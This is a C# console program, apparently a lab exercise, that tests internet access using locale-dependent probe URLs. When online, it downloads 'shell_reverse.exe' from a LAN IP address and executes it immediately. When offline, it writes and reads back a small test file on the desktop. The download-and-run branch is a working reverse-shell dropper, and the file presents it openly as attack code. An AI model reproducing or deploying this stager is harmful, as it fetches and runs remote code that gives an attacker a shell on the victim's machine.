using System;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;

namespace ReverseShellCheckInternet
{
    class Program
    {
        static void Main(string[] args)
        {
            //Console.WriteLine("Hello World!");
            if (CheckForInternetConnection() == true)
            {
                Console.WriteLine("Still Connect Internet");
                var filename = "reverse_shell";
                //dowload file
                new WebClient().DownloadFile("http://192.168.111.140/shell_reverse.exe", filename);
                //get current path
                string path = AppDomain.CurrentDomain.BaseDirectory;
                System.Diagnostics.Process.Start(path+filename);
                Console.ReadLine();

            }
            else
            {
                Console.WriteLine("Internet Disconected");

                string path = @"C:\Users\MadTik\Desktop\MyTest.txt";
                try
                {
                    // Create the file, or overwrite if the file exists.
                    using (FileStream fs = File.Create(path))
                    {
                        byte[] info = new UTF8Encoding(true).GetBytes("Tri - 1852015");
                        // Add some information to the file.
                        fs.Write(info, 0, info.Length);
                    }
                    // Open the stream and read it back.
                    using (StreamReader sr = File.OpenText(path))
                    {
                        string s = "";
                        while ((s = sr.ReadLine()) != null)
                        {
                            Console.WriteLine(s);
                        }
                    }
                }

                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
                Console.ReadLine();
            }    
        }
        public static bool CheckForInternetConnection(int timeoutMs = 10000, string url = null)
        {
            try
            {
                url ??= CultureInfo.InstalledUICulture switch
                {
                    { Name: var n } when n.StartsWith("fa") => // Iran
                        "http://www.aparat.com",
                    { Name: var n } when n.StartsWith("zh") => // China
                        "http://www.baidu.com",
                    _ =>
                        "http://www.gstatic.com/generate_204",
                };

                var request = (HttpWebRequest)WebRequest.Create(url);
                request.KeepAlive = false;
                request.Timeout = timeoutMs;
                using var response = (HttpWebResponse)request.GetResponse();
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
